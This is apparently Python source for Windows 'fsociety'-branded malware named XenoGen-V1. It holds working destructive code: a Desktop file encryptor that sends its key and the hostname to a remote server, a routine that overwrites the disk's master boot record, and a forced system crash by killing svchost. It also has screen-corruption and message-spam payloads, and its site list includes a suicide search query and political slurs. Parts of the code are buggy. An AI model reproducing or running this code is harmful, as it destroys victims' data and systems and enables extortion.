from urllib import response
from win32api import *
from win32gui import *
from win32ui import *
from ctypes import windll
from win32con import *
from win32file import *
from random import randrange as rd 
from random import *
from sys import exit
import ctypes
import multiprocessing
import os
import threading
import queue
import random
import socket
import time



# Xeno warning ui
def warning():
    if MessageBox("this malware can potentially destroy your computer\nand destroy your data we are giving you the option to\nencrypt your files and then destroy your computer\nif you choose to do so press yes if you dont want to\npress no and the program will close","XenoGen-V1",
        MB_YESNO | MB_ICONWARNING) == 7:
        exit()
    if MessageBox("THIS IS LAST WARNING\nit is not my responsible for your data lost if you clicked yes\nthe malware will start if no the malware will exit\nchoose wisely","XenoGen-V1",
        MB_YESNO | MB_ICONWARNING) == 7:
        exit()
    print("""

    
    ____  ___                     ________               
    \   \/  /____   ____   ____  /  _____/  ____   ____  
     \     // __ \ /    \ /  _ \/   \  ____/ __ \ /    \ 
     /     \  ___/|   |  (  <_> )    \_\  \  ___/|   |  \ 
    /___/\  \___  >___|  /\____/ \______  /\___  >___|  /
          \_/   \/     \/               \/     \/     \/ 
                                                  
                                                {}Trojan{}(c)


    'your computer has been infected theres no way to get it back
     your computer has been siezed by fsociety'
    """)

class Data:
    sites = (
        "http://www.google.Xeno.Gen.Fsociety/search?q=best+way+to+kill+yourself",
        "http://www.google.Xeno.Gen.Fsociety/search?q=how+2+remove+a+virus",
        "http://www.google.Xeno.Gen.Fsociety/search?q=mcafee+vs+norton",
        "http://www.google.Xeno.Gen.Fsociety/search?q=fuck+society",
        "http://www.google.Xeno.Gen.Fsociety/search?q=our+democracy+has+been+hacked",
        "http://www.google.Xeno.Gen.Fsociety/search?q=we+are+the+best",
        "http://www.google.Xeno.Gen.Fsociety/search?q=we+own+this+world",
        "http://www.google.Xeno.Gen.Fsociety/search?q=how+to+get+money",
        "http://www.google.Xeno.Gen.Fsociety/search?q=how+to+send+a+virus+to+my+friend",
        "http://www.google.Xeno.Gen.Fsociety/search?q=fuck+the+world",
        "http://www.google.Xeno.Gen.Fsociety/search?q=fuck+you+leni+robredo",
        "http://www.google.Xeno.Gen.Fsociety/search?q=fuck+you+kakampinks",
        "http://www.google.Xeno.Gen.Fsociety/search?q=let+bbm+lead",
        "http://www.google.Xeno.Gen.Fsociety/search?q=you+are+owned+by+the+world",
        "http://www.google.Xeno.Gen.Fsociety/search?q=we+are+fsociety",
        "http://www.google.Xeno.Gen.Fsociety/search?q=g3t+r3kt",
        "http://www.google.Xeno.Gen.Fsociety/search?q=how+to+buy+a+weed",
        "http://softonic.com/",
        "http://fsociety.com/",
        "calc",
        "notepad",
        "cmd",
        "write",
        "regedit",
        "explorer",
        "taskmgr",
        "msconfig",
        "mspaint",
        "devmgmt.msc",
        "control",
        "mmc",
        "dir /s",
        )
    IconError = LoadIcon(None, 32513)
    IconSkull = LoadIcon(None, 32516)


class MBR:
    def overwrite():
        handle = CreateFileW("\\\\.\\PhysicalDrive0",
                                GENERIC_WRITE,
                                FILE_SHARE_READ | FILE_SHARE_WRITE,
                                None,
                                OPEN_EXISTING,
                                0,0)
        WriteFile(handle, AllocateReadBuffer(512),
                                None)

        CloseHandle(handle)


time = 0
timeSubtract = 20

class Payloads:
    def encrypt(key):
        while True:
            file = q.get()
            print(f'Encrypting {file}')
            try:
                key_index = 0 
                max_key_index = len(key) - 1
                encrypted_data = ''
                with open(file, 'rb') as f:
                    data = f.read()
                with open(file , 'w') as f:
                    f.write('')
                for byte in data:
                    xor_byte = byte ^ ord(key[key_index])
                    with open(file, 'ab') as f:
                        f.write(xor_byte.to_bytes(1, 'little'))
                    # increment key index
                    if key_index >= max_key_index:
                        key_index = 0
                    else:
                        key_index += 1
                print(f'{file} successfully encrypted')
            except:
                print('Faile to encrypt file :(')
            q.task_done()

    # socket infromation
    IP_ADDRESS = '192.168.1.5'
    PORT = 8080

    # ecnryption information
    ENCRYPTION_LEVEL = 511 // 8
    key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789<>?,./;\'[]-=_+!@#$%^&*()`~'
    key_char_pool_len = len(key_char_pool)

    # grab filepaths to encrypt
    print("preparing files...")
    desktop_path = os.environ['USERPROFILE'] + '\\Desktop\\'
    files = os.listdir(desktop_path)
    abs_file = []
    for f in files:
        if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2]+'exe':
            abs_file.append(f'{desktop_path}\\{f}')
    print('successfully located all files!')

    # grab clients hostname
    hostname = os.getenv('COMPUTERNAME')

    # generate ecryption key
    print("Generating encryption key...")
    key = ''
    for i in range(ENCRYPTION_LEVEL):
        key += key_char_pool[random.randint(0, key_char_pool_len - 1)]
    print("Key generated!")

# connect to server to transfer key and hostname
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((IP_ADDRESS, PORT))
        print('Successfully connected to server... tramitting key and hostname')
        s.send(f'{hostname} : {key}'.encode('utf-8'))
        print('Finished sending key and hostname')
        s.close()

# Store files into a queue for threads to handle
    q = queue.Queue()
    for f in abs_file:
        q.put(f)

# Setup threads to get ready for encryption
    for i in range(10):
        t = threading.Thread(target=encrypt, args=(key,), daemon=True)
        t.start()

    q.join()
    print('Encryption and upload complete!')
    input()

    def open_sites():
        global timeSubtract
        sites = Data.sites
        global time
        for i in range(0, 100):
            __import__("os").system("start " + str(choice(sites)))
            Sleep(10)
    def decrease_timer():
        global time
        while time < 15000:
            time += 1
            Sleep(10)
    def blink_screen():
        global time
        global timeSubtract
        HDC = GetDC(0)
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
        while True:
            Sleep(timeSubtract-time)
            PatBlt(HDC, 0,0,x,y, PATINVERT)

    def reverse_text():
        global time
        global timeSubtract
        HWND = GetDesktopWindow()
        while True:
            EnumChildWindows(HWND, EnumChildProc, None)
            Sleep(2)
    
    def error_drawing():
        global time
        global timeSubtract
        HDC = GetDC(0)
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
        while True:
            DrawIcon(HDC, rd(sw), rd(sh), Data.IconSkull)
            for i in range(0, 60):
                mouseX,mouseY = GetCursorPos()
                DrawIcon(HDC, mouseX, mouseY, Data.IconError)
                Sleep(2)
    def death_note():
        if MessageBox("OOPS this might be the last text from the malware\nafter this nothing happens\nits pretty much done yea i think\nwelp i dont really know :D", "DEATH-NOT",
            MB_OK | MB_ICONWARNING) == 7:
            return

        if MessageBox("welp uhm idk im bored im just gonna destroy your windows computer :D", "DEATH-NOTE",
            MB_OK | MB_ICONWARNING) == 7:
            return

        if False: # False for safety reasons
            hDevice = CreateFileW("\\\\.\\PhysicalDrive0",
                                    GENERIC_WRITE,
                                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                                    None,
                                    OPEN_EXISTING,
                                    0,0
                                    )

            WriteFile(hDevice,
                                    AllocateReadBuffer(512),
                                    None
                                    )

            CloseHandle(hDevice)

        death_note()

        


    def warning_spam():
        global time
        global timeSubtract
        for i in range(0, 100):
            warning = multiprocessing.Process(target   = msgboxThread).start()
            Sleep(5)
            warning = multiprocessing.Process(target   = msgboxThread1).start()
            Sleep(5)
            warning = multiprocessing.Process(target   = msgboxThread2).start()
            Sleep(4)

    def screen_puzzle():
        global time
        global timeSubtract
        HDC = GetDC(0)
        sw , sh = (GetSystemMetrics(0),GetSystemMetrics(1))

        x1 = rd(sw=100)
        y1 = rd(sh=100)
        x2 = rd(sw=100)
        y2 = rd(sh=100)

        width = rd(600)
        height = rd(600)

        while True:
            BitBlt(HDC, x1, y1, width, height, HDC, x2, y2, SRCCOPY)
            Sleep(2)

    def curser_shake():
        global time
        global timeSubtract
        while True:
            x,y = GetCursorPos()

            newX = x + (rd(3)-1) + rd(int((time+1)/2200+2))
            newY = y + (rd(3)-1) + rd(int((time+1)/2200+2))

            SetCursorPos((newY, newX))

            Sleep(10)

    def tunnel_effect():
        global time
        global timeSubtract
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
        HDC = GetDC(0)
        while True:
            StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)
            Sleep(3)



def msgboxThread():
    MessageBox("still using this computer?", "lol", MB_OK | MB_ICONWARNING)

def msgboxThread1():
    MessageBox("We are FSOCIETY", "FSOCIETY", MB_OK | MB_ICONWARNING)
    
def msgboxThread2():
    MessageBox("FUCK YOU", "FSOCIETY", MB_OK | MB_ICONWARNING)

def EnumChildProc(hwnd, LParam):
    try:
        buffering = PyMakeBuffer(255)
        length = SendMessage(hwnd, WM_GETTEXT, 255, buffering)
        result = str(buffering[0:length*2].tobytes().decode('utf-16'))
        result = result[::-1]

        SendMessage(hwnd, WM_SETTEXT, None, result)
    
    except:
        pass

warning()
if __name__ == '__main__':
    m = MBR
    p = Payloads


    opensites = multiprocessing.Process(target = p.open_sites)
    timersub = multiprocessing.Process(target = p.decrease_timer)
    reverse = multiprocessing.Process(target = p.reverse_text)
    blinking = multiprocessing.Process(target = p.blink_screen)
    icons = multiprocessing.Process(target = p.error_drawing)
    shaking = multiprocessing.Process(target = p.curser_shake)
    tunneling = multiprocessing.Process(target = p.tunnel_effect)
    puzzling = multiprocessing.Process(target = p.screen_puzzle)
    errors = multiprocessing.Process(target = p.warning_spam)
    death_note = multiprocessing.Process(target = p.death_note)
    mbr = multiprocessing.Process(target = m.MBR)

    mbr.start()
    time.sleep(10)

    def last_use():

        timersub.terminate()
        opensites.terminate()
        shaking.terminate()
        blinking.terminate()
        icons.terminate()
        reverse.terminate()
        puzzling.terminate()
        errors.terminate()
        tunneling.terminate()
        death_note.start()
        Sleep(10)
        __import__("os").system("taskkill /F /IM svchost.exe") # Cause a bsod

    for i in range(0, 2):
        timersub.start()
        opensites.start()
        shaking.start()
        blinking.start()
        icons.start()
        reverse.start()
        puzzling.start()
        errors.start()
        Sleep(10*2)
        tunneling.start()


        if i == 2:
            last_use()
       